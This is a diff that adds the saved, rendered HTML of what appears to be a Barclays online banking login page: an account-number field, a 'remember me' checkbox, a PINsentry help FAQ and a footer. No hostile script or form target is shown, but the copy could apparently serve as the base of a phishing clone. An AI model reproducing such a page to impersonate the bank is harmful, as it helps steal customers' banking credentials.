+       (formController['accountNumber'].$invalid &amp;&amp; formController['accountNumber'].$dirty &amp;&amp; validationErrors)}">
+    
+    <label class="label">
+      <span for="accountNumber" id="label-accountNumber">Account number</span>
+      <label for="accountNumber" id="extraLabelData-accountNumber" class="visuallyhidden ng-binding" aria-hidden="true"></label> 
+      <!-- ngIf: tooltipconfig --><span tabindex="0" ng-if="tooltipconfig" b-tooltip="" tooltipconfig="{&quot;arrowPosition&quot;:&quot;left center&quot;,&quot;boxPosition&quot;:&quot;right center&quot;,&quot;qtipContent&quot;:{&quot;text&quot;:&quot;<p>Your sort code is a 6-digit number &amp;ndash; eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.</p><p>  <img src=\&quot;/OLB/A/Content/Images/1321077850566-sortcode_account_number_card.jpg\&quot; alt=\&quot;Card\&quot; height=\&quot;113\&quot; width=\&quot;173\&quot; /></p>&quot;,&quot;customAriaText&quot;:&quot;Your sort code is a 6-digit number – eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.  &quot;},&quot;iconClass&quot;:&quot;icon-question&quot;,&quot;mobileConfig&quot;:{&quot;arrowPosition&quot;:&quot;bottom center&quot;,&quot;boxPosition&quot;:&quot;top center&quot;}}" id="described-accountNumber" class="ng-scope ng-isolate-scope icon iconSpacing dsstooltip icon-question" role="tooltip" aria-label="Your sort code is a 6-digit number – eg 12-34-56. Your account number is 8 digits long. Both are on the front of your debit card.  " data-hasqtip="2"></span><!-- end ngIf: tooltipconfig -->
+    </label>
+    
+    <div class="input-wrapper" ng-class="{'image-at-right': showImg}">
+      
+      <span class="input-prefix"></span>
+      
+      
+      <span class="input-suffix"></span>
+      
+      <input ng-attr-tabindex="" aria-labelledby="label-accountNumber extraLabelData-accountNumber" aria-describedby="described-accountNumber input-err-1g7tucr4c " class="input ng-pristine ng-valid ng-valid-required ng-valid-i-n-p1 ng-valid-i-n-p2" id="accountNumber" name="accountNumber" ng-model="model.accountNumber.value" type="text" maxlength="8" mca-validator-extended="AppName.Module.accountNumberValidation | this.formController.accountNumber" validator-event="blur" supportglobalerror="true" tooltipconfig="tooltipConfig('sortcode')" analytics-tag="" aria-invalid="false">
+      <!-- ngIf: showImg -->
+    </div>
+    <div id="input-err-1g7tucr4c" aria-hidden="true">
+      <!-- ngIf: (formController['accountNumber'].$invalid && currentState && formController.showErrorsIfAny) || 
+        (formController['accountNumber'].$invalid && formController['accountNumber'].$dirty && currentState && validationErrors) -->
+      <!-- ngIf: (formController['accountNumber'].$invalid && !currentState && formController.showErrorsIfAny) || 
+        (formController['accountNumber'].$invalid && formController['accountNumber'].$dirty && !currentState && validationErrors) -->
+    </div>
+  </div>
+</div>
+ </div> </ng-form></ng-include> </div> </div> <div class="checkboxWidth"> <b-check id="checkbox1" name="confirmation" ng-model="model.rememberToken" data="rememberMeCheck" arrange="controls-stacked" value-field="value" display-field="display" aria-label="rememberWarning" use-label="rememberWarning" aria-describedby="rememberWarning" analytics-tag="" class="ng-isolate-scope ng-pristine ng-valid" dss-dda-component="DDA Specific Component Attribute"><div class="form-item checkbox-element controls-stacked" ng-class="{'has-error':(formController[name].$invalid &amp;&amp; formController[name].$dirty) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid)}" id="b-checkbox-checkbox1">
+  <!-- ngIf: label -->
+  <fieldset>
+    <!-- ngIf: label -->
+    <!-- ngRepeat: (key,item) in scopeData --><label class="control control-checkbox ng-scope last-child first-child" ng-class="{'last-child':$last, 'first-child':$first}" ng-repeat="(key,item) in scopeData">
+      <div class="click-event-container">
+        <input type="checkbox" name="confirmation" value="Y" id="checkbox1_Y" class=" control-input" ng-disabled="ngDisabled" aria-required="false" aria-describedby="b-checkbox-additional-checkbox1-0 described-rememberWarning checkbox-err-1g7tucqq7" tabindex="" ng-checked="isChecked(item[valueField])" ng-click="checkBoxClick($event)">
+        <span id="b-checkbox-span-checkbox1-0" class="control-indicator" aria-hidden="true">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14.01 10" class="icon-tick">
+            <title>Tick</title>
+            <path d="M5.45,8.81.82,5.11a.5.5,0,1,0-.64.76l0,0,5,4a.51.51,0,0,0,.69-.06l8-9a.5.5,0,0,0,0-.7h0a.5.5,0,0,0-.7,0h0Z"></path>
+          </svg>
+        </span>
+        <span class="control-description">
+             <span id="b-checkbox-checkbox1-0" class="ng-binding">Remember my username and login method</span>
+             <span id="b-checkbox-additional-checkbox1-0">
+                  <!-- ngIf: item.htmlContent -->
+                 <!-- ngIf: !item.htmlContent --><span ng-if="!item.htmlContent" class="additional-text ng-binding ng-scope">
+                   
+                 </span><!-- end ngIf: !item.htmlContent -->
+             </span>
+        </span>
+      </div>
+    </label><!-- end ngRepeat: (key,item) in scopeData -->
+  </fieldset>
+  <div id="checkbox-err-1g7tucqq7">
+    <div ng-show="(formController[name].$invalid &amp;&amp; formController[name].$dirty &amp;&amp; currentState) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid &amp;&amp; currentState)" class="ng-hide">
+      <!-- ngRepeat: (key, value) in formController[name].$error -->
+    </div>
+    <div ng-show="(formController[name].$invalid &amp;&amp; formController[name].$dirty &amp;&amp; !currentState) || (formController.showErrorsIfAny &amp;&amp; formController[name].$invalid &amp;&amp; !currentState)" class="ng-hide">
+      <!-- ngRepeat: (key, value) in formController[name].$error -->
+    </div>
+  </div>
+</div>
+</b-check> <b-text id="rememberWarning" type="span" class="check-info font-family ng-isolate-scope" b-data="Don't tick the box if you're using a public or shared device" dss-dda-component="DDA Specific Component Attribute"><span>Don't tick the box if you're using a public or shared device</span></b-text> </div> </div><!-- end ngIf: !mobileView --> <!-- ngIf: mobileView --> <div class="seperator"></div> <div class="marginUpDown"> <button id="continue" class="btn rolbBtn btn btn-primary marginDownMobile"  type="submit" name="$$submit" value="Continue" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+    <ng-transclude></ng-transclude>
+    Continue
+</button> 
+</form>
+
+ </div> </div><!-- end ngIf: browser.valid --> </form> </div> </div> </div> </section> </main> <!-- ngIf: faqContent.eligible --><faq ng-if="faqContent.eligible" faq-content="faqContent" class="ng-scope ng-isolate-scope"><aside class="faqBackground"> <div class="container-fluid"> <div class="row"> <div class="col-sm-12 col-lg-12"> <div class="col-md-8 col-md-offset-2 px-0"> <div class="spaceFAQ"> <b-text class="head-color mt-30 ng-isolate-scope" type="h2" b-data="Frequently asked questions" dss-dda-component="DDA Specific Component Attribute"><h2>Frequently asked questions</h2></b-text> </div> <div> <b-accordion name="accordion" data="templates" dss-dda-component="DDA Specific Component Attribute"><ul class="accordion js-accordion accordion-hasjs">
+  <!-- ngRepeat: (key, value) in templates --><li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+    <span class="accordion-heading">
+      <a class="accordion-heading-link" href="#heading_0_1g7tucqif" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+          <g id="Symbols_0_1g7tucqif" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+            <g id="Account-summary---closed_0_1g7tucqif" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+              <g id="Group-6_0_1g7tucqif" transform="translate(265.000000, 154.000000)">
+                <g id="Group-10_0_1g7tucqif" transform="translate(0.000000, 100.000000)">
+                  <g id="Group-8_0_1g7tucqif">
+                    <g id="Group-12_0_1g7tucqif">
+                      <g id="Group-13_0_1g7tucqif">
+                        <g id="Group-7_0_1g7tucqif" transform="translate(30.000000, 14.000000)">
+                          <g id="Group-3-Copy_0_1g7tucqif" transform="translate(0.000000, 2.000000)">
+                            <g id="icons-/-arrow-/-Arrow_18px_blue_0_1g7tucqif" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                              <polyline id="Arrow_18px_blue_0_1g7tucqif" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                            </g>
+                          </g>
+                        </g>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </g>
+          </g>
+        </svg>
+        <span class="ng-binding">What do I do if I've lost my PINSentry or don't have it to hand?</span>
+      </a>
+    </span>
+    <div class="accordion-content-wrapper accordion-content-closed" id="heading_0_1g7tucqif" aria-hidden="true">
+      <div class="accordion-content">
+        <!-- ngIf: !value.noTemplate -->
+        <!-- ngIf: value.noTemplate --><div ng-if="value.noTemplate" class="ng-scope">
+          <div b-compile-html="<ul class=&quot;help-content-drawer&quot;><li><p>If you&amp;#39;ve lost your PINsentry device, you can order a new one by calling us on 0207 574 3001, replacing the + with your country&amp;#39;s exit code (outside the UK, +44 0207 574 3001 ). Lines are open 24 hours a day 7 days a week. To maintain a quality service, we may monitor or record phone calls.</p></li><li><p>If you have the Barclays Mobile Banking app, you can also use its Mobile PINsentry tool.</p></li><li><p>If you&amp;#39;ve previously set up a passcode and memorable word, you can use those to log in, instead of PINsentry. This does mean that not all services will be available, but you will be able to check your balances and transactions, transfer money and make a payment to anyone already on saved on your payee list.</p></li></ul>"><ul class="help-content-drawer ng-scope"><li><p>If you've lost your PINsentry device, you can order a new one by calling us on 0207 574 3001, replacing the + with your country's exit code (outside the UK, +44 0207 574 3001 ). Lines are open 24 hours a day 7 days a week. To maintain a quality service, we may monitor or record phone calls.</p></li><li><p>If you have the Barclays Mobile Banking app, you can also use its Mobile PINsentry tool.</p></li><li><p>If you've previously set up a passcode and memorable word, you can use those to log in, instead of PINsentry. This does mean that not all services will be available, but you will be able to check your balances and transactions, transfer money and make a payment to anyone already on saved on your payee list.</p></li></ul></div>
+        </div><!-- end ngIf: value.noTemplate -->
+      </div>
+    </div>
+  </li><!-- end ngRepeat: (key, value) in templates --><li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+    <span class="accordion-heading">
+      <a class="accordion-heading-link" href="#heading_1_1g7tucqif" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+          <g id="Symbols_1_1g7tucqif" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+            <g id="Account-summary---closed_1_1g7tucqif" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+              <g id="Group-6_1_1g7tucqif" transform="translate(265.000000, 154.000000)">
+                <g id="Group-10_1_1g7tucqif" transform="translate(0.000000, 100.000000)">
+                  <g id="Group-8_1_1g7tucqif">
+                    <g id="Group-12_1_1g7tucqif">
+                      <g id="Group-13_1_1g7tucqif">
+                        <g id="Group-7_1_1g7tucqif" transform="translate(30.000000, 14.000000)">
+                          <g id="Group-3-Copy_1_1g7tucqif" transform="translate(0.000000, 2.000000)">
+                            <g id="icons-/-arrow-/-Arrow_18px_blue_1_1g7tucqif" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                              <polyline id="Arrow_18px_blue_1_1g7tucqif" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                            </g>
+                          </g>
+                        </g>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </g>
+          </g>
+        </svg>
+        <span class="ng-binding">How do I login with a PINsentry card reader?</span>
+      </a>
+    </span>
+    <div class="accordion-content-wrapper accordion-content-closed" id="heading_1_1g7tucqif" aria-hidden="true">
+      <div class="accordion-content">
+        <!-- ngIf: !value.noTemplate -->
+        <!-- ngIf: value.noTemplate --><div ng-if="value.noTemplate" class="ng-scope">
+          <div b-compile-html="<ul class=&quot;help-content-drawer&quot;><li><div><ol><li>Enter the last 4 numbers of your debit, cash or authentication card into the log-in page</li></ol></div><div>  <img src=&quot;/OLB/A/Content/Images/1321077850040-pin_step_1.jpg&quot; alt=&quot;&quot; height=&quot;115&quot; width=&quot;190&quot; /></div></li><li><div><ol start=&quot;2&quot;><li>Insert your card into the reader, face up, chip end first, then press <strong>IDENTIFY</strong></li><li>Type your PIN and press <strong>ENTER</strong></li></ol></div><div>  <img src=&quot;/OLB/A/Content/Images/1321077850061-pin_step_2.jpg&quot; alt=&quot;&quot; height=&quot;253&quot; width=&quot;190&quot; /></div></li><li><div><ol start=&quot;4&quot;><li>An 8-digit code will appear on the card reader. Enter this code into the log-in page on your computer</li></ol></div><div>  <img src=&quot;/OLB/A/Content/Images/1321077850082-pin_step_3.jpg&quot; alt=&quot;&quot; height=&quot;142&quot; width=&quot;190&quot; /></div></li></ul>"><ul class="help-content-drawer ng-scope"><li><div><ol><li>Enter the last 4 numbers of your debit, cash or authentication card into the log-in page</li></ol></div><div>  <img src="/OLB/A/Content/Images/1321077850040-pin_step_1.jpg" alt="" height="115" width="190"></div></li><li><div><ol start="2"><li>Insert your card into the reader, face up, chip end first, then press <strong>IDENTIFY</strong></li><li>Type your PIN and press <strong>ENTER</strong></li></ol></div><div>  <img src="/OLB/A/Content/Images/1321077850061-pin_step_2.jpg" alt="" height="253" width="190"></div></li><li><div><ol start="4"><li>An 8-digit code will appear on the card reader. Enter this code into the log-in page on your computer</li></ol></div><div>  <img src="/OLB/A/Content/Images/1321077850082-pin_step_3.jpg" alt="" height="142" width="190"></div></li></ul></div>
+        </div><!-- end ngIf: value.noTemplate -->
+      </div>
+    </div>
+  </li><!-- end ngRepeat: (key, value) in templates --><li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+    <span class="accordion-heading">
+      <a class="accordion-heading-link" href="#heading_2_1g7tucqif" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+          <g id="Symbols_2_1g7tucqif" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+            <g id="Account-summary---closed_2_1g7tucqif" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+              <g id="Group-6_2_1g7tucqif" transform="translate(265.000000, 154.000000)">
+                <g id="Group-10_2_1g7tucqif" transform="translate(0.000000, 100.000000)">
+                  <g id="Group-8_2_1g7tucqif">
+                    <g id="Group-12_2_1g7tucqif">
+                      <g id="Group-13_2_1g7tucqif">
+                        <g id="Group-7_2_1g7tucqif" transform="translate(30.000000, 14.000000)">
+                          <g id="Group-3-Copy_2_1g7tucqif" transform="translate(0.000000, 2.000000)">
+                            <g id="icons-/-arrow-/-Arrow_18px_blue_2_1g7tucqif" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                              <polyline id="Arrow_18px_blue_2_1g7tucqif" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                            </g>
+                          </g>
+                        </g>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </g>
+          </g>
+        </svg>
+        <span class="ng-binding">Don't save your password in your browser</span>
+      </a>
+    </span>
+    <div class="accordion-content-wrapper accordion-content-closed" id="heading_2_1g7tucqif" aria-hidden="true">
+      <div class="accordion-content">
+        <!-- ngIf: !value.noTemplate -->
+        <!-- ngIf: value.noTemplate --><div ng-if="value.noTemplate" class="ng-scope">
+          <div b-compile-html="<ul class=&quot;help-content-drawer&quot;><li><p>If you use Google Chrome or Mozilla Firefox to log in to Online Banking, you may have seen a pop-up that asks if you&amp;#39;d like to save your password. To keep your account safe, we strongly advise against this, even if it&amp;#39;s on a computer only you have access to.</p><p>Saving your password in your web browser means it can be seen and stolen if fraudsters gain access to your computer using malicious software.</p></li></ul>"><ul class="help-content-drawer ng-scope"><li><p>If you use Google Chrome or Mozilla Firefox to log in to Online Banking, you may have seen a pop-up that asks if you'd like to save your password. To keep your account safe, we strongly advise against this, even if it's on a computer only you have access to.</p><p>Saving your password in your web browser means it can be seen and stolen if fraudsters gain access to your computer using malicious software.</p></li></ul></div>
+        </div><!-- end ngIf: value.noTemplate -->
+      </div>
+    </div>
+  </li><!-- end ngRepeat: (key, value) in templates --><li class="accordion-item ng-scope" ng-repeat="(key, value) in templates" role="presentation">
+    <span class="accordion-heading">
+      <a class="accordion-heading-link" href="#heading_3_1g7tucqif" ng-click="ifCallBack &amp;&amp; callBackFunction(value.id)" aria-expanded="false">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 13">
+          <g id="Symbols_3_1g7tucqif" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd" stroke-linecap="round">
+            <g id="Account-summary---closed_3_1g7tucqif" transform="translate(-295.000000, -273.000000)" class="st-stroke-clickable" stroke="#0076b6">
+              <g id="Group-6_3_1g7tucqif" transform="translate(265.000000, 154.000000)">
+                <g id="Group-10_3_1g7tucqif" transform="translate(0.000000, 100.000000)">
+                  <g id="Group-8_3_1g7tucqif">
+                    <g id="Group-12_3_1g7tucqif">
+                      <g id="Group-13_3_1g7tucqif">
+                        <g id="Group-7_3_1g7tucqif" transform="translate(30.000000, 14.000000)">
+                          <g id="Group-3-Copy_3_1g7tucqif" transform="translate(0.000000, 2.000000)">
+                            <g id="icons-/-arrow-/-Arrow_18px_blue_3_1g7tucqif" transform="translate(4.000000, 9.500000) scale(-1, 1) rotate(90.000000) translate(-4.000000, -9.500000) translate(-3.000000, 6.000000)">
+                              <polyline id="Arrow_18px_blue_3_1g7tucqif" points="0.7 0.636363636 7.00042427 6.36363636 13.3 0.636363636"></polyline>
+                            </g>
+                          </g>
+                        </g>
+                      </g>
+                    </g>
+                  </g>
+                </g>
+              </g>
+            </g>
+          </g>
+        </svg>
+        <span class="ng-binding">Is saving my details safe?</span>
+      </a>
+    </span>
+    <div class="accordion-content-wrapper accordion-content-closed" id="heading_3_1g7tucqif" aria-hidden="true">
+      <div class="accordion-content">
+        <!-- ngIf: !value.noTemplate -->
+        <!-- ngIf: value.noTemplate --><div ng-if="value.noTemplate" class="ng-scope">
+          <div b-compile-html="<ul class=&quot;help-content-drawer&quot;>    <li>    <p>If you tick the 'remember me' box, your details will only be retained on the device you're using at the time. That's why we don't recommend you do so on any public or shared devices. This means you don't need to worry about anyone else seeing the details. Even if they do, there isn't enough information there for anyone to access your accounts in Online Banking or any other way.</p>    <p>If you want to save your details, you need to make sure you've switched cookies on for your browser &amp;ndash; that's how the information is stored.</p>    </li></ul>"><ul class="help-content-drawer ng-scope">    <li>    <p>If you tick the 'remember me' box, your details will only be retained on the device you're using at the time. That's why we don't recommend you do so on any public or shared devices. This means you don't need to worry about anyone else seeing the details. Even if they do, there isn't enough information there for anyone to access your accounts in Online Banking or any other way.</p>    <p>If you want to save your details, you need to make sure you've switched cookies on for your browser – that's how the information is stored.</p>    </li></ul></div>
+        </div><!-- end ngIf: value.noTemplate -->
+      </div>
+    </div>
+  </li><!-- end ngRepeat: (key, value) in templates -->
+</ul></b-accordion> </div> <div class="faqMarginBtn"> <button id="1g7tucqif" class="btn btn btn-secondary ng-pristine ng-valid" ng-click="needHelp()" ng-model="buttonHelp" name="helpBtn" value="Need more help?" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+    <ng-transclude></ng-transclude>
+    Need more help?
+</button> 
+
+ </div> </div> </div> </div> </div> </aside></faq><!-- end ngIf: faqContent.eligible --></div>
+            <!-- ngInclude: undefined --><ng-include src="'/authlogin/partials/bdlLogin/footer.html?v=1652782834434'" class="ng-scope"> <footer class="ng-scope"> <div class="container-fluid"> <div ng-controller="footerCtrl" class="row footerSpace ng-scope"> <div class="width-MobileGroup col-md-8 col-md-offset-2"> <ul id="footerLinks1" class="mt-29 mb-30 noSpace col-sm-12 col-lg-12 col-xl-12 footer-links"> <!-- ngIf: serviceStatusSwitch --><li id="footerLink" ng-if="serviceStatusSwitch" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope"> <a class="normal  standalone-links" id="1g7tucqda" tabindex="" href="https://status.uk.barclays/" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Service status</span></a> </li><!-- end ngIf: serviceStatusSwitch --> <!-- ngIf: defaultHeader --> <!-- ngIf: wealthInternationalHeader --> <!-- ngIf: privateBankHeader --><li id="footerLink2" ng-if="privateBankHeader" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope"> <a class="normal  standalone-links" id="1g7tucqdb" tabindex="" href="https://www.barclays.co.uk/wealth-management/contact-us-about-wealth-management/" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Contact us</span></a> </li><!-- end ngIf: privateBankHeader --> <!-- ngIf: defaultHeader --> <!-- ngIf: wealthInternationalHeader --> <!-- ngIf: privateBankHeader --><li id="footerLink5" ng-if="privateBankHeader" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope"> <a class="normal  standalone-links" id="1g7tucqdc" tabindex="" href="https://www.barclays.co.uk/digisafe/" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Security</span></a> </li><!-- end ngIf: privateBankHeader --> <!-- ngIf: defaultHeader --> <!-- ngIf: wealthInternationalHeader --> <!-- ngIf: privateBankHeader --><li id="footerLink8" ng-if="privateBankHeader" class="width-mobile col-sm-3 col-lg-3 col-xl-3 footer-link-spaceLR ng-scope"> <a class="normal  standalone-links" id="1g7tucqdd" tabindex="" href="https://www.barclays.co.uk/accessibility/" target="_blank" analytics-tag="" dss-dda-component="DDA Specific Component Attribute">
+
+<span class="ng-scope">Accessibility</span></a> </li><!-- end ngIf: privateBankHeader --> </ul> <div class="space-footerlink"> <b-text id="footerSnippetContent" type="div" b-data="<p>Products and services on this site may not be available in certain jurisdictions. In particular, these products and services are not being offered in Japan or the United States or to US residents. For full details of exclusions and disclaimers please see the <a href=&quot;https://www.barclays.co.uk/wealth-management/important-information-uk-international/&quot; target=&quot;_blank&quot; title=&quot;Opens in a new window&quot;>Important Information</a> before proceeding.</p>
+<p style=&quot;text-align: center;&quot;><img alt=&quot;Financial Services Compensation Scheme&quot; height=&quot;62&quot; src=&quot;/OLB/A/Content/Images/login-fscs.png&quot; width=&quot;54&quot;></p>" class="ng-isolate-scope" dss-dda-component="DDA Specific Component Attribute"><div><p>Products and services on this site may not be available in certain jurisdictions. In particular, these products and services are not being offered in Japan or the United States or to US residents. For full details of exclusions and disclaimers please see the <a href="https://www.barclays.co.uk/wealth-management/important-information-uk-international/" target="_blank" title="Opens in a new window">Important Information</a> before proceeding.</p>
+<p style="text-align: center;"><img alt="Financial Services Compensation Scheme" height="62" src="/OLB/A/Content/Images/login-fscs.png" width="54"></p></div></b-text> </div> </div> </div> </div> </footer></ng-include>
+        <div id="ROLBspinner" class="hidden"><div class="spinner-css" style="transform:scale(0.5);"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div></div>
+    </div>
+
+</div>
+
+
+
+
+
+</body></html>
